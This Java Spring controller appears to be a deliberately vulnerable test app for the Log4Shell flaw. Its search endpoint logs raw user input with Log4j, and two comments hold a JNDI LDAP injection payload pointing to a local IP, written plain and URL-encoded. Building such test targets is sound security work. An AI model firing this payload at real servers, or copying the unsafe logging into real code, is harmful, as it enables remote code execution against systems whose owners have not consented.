package com.log4jvultest.api;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
class Home {

    static Logger log = LogManager.getLogger(Home.class.getName());


  @GetMapping("/search")
  public String search(@RequestParam String query) {
    log.info("Search query: {}" , query);
    return query;
  }

  //${jndi:ldap://192.168.1.11:1389/a}

  //URL Encoded
  //%24%7Bjndi%3Aldap%3A%2F%2F192.168.1.11%3A1389%2Fa%7D

}